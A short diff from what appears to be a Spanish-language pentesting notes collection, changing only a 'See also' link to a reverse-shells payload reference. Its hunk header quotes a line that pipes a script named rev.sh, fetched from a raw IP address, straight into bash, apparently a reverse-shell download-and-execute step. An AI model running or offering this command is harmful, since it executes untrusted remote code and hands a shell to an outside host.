@@ -36,4 +36,4 @@ curl http://145.239.181.13/rev.sh | bash
 
 ## Ver también
 
-- [[Reverse Shells]] — referencias de payloads por lenguaje
+- [[12-tools--and--referencia/reverse-shells|Reverse Shells]] — referencias de payloads por lenguaje
